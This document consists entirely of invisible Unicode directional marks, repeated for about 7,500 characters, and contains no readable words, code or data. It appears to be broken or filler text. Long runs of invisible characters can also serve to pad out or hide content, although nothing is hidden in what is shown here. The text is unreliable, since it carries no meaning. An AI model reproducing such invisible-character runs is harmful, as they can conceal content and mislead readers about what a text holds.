‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎‏‎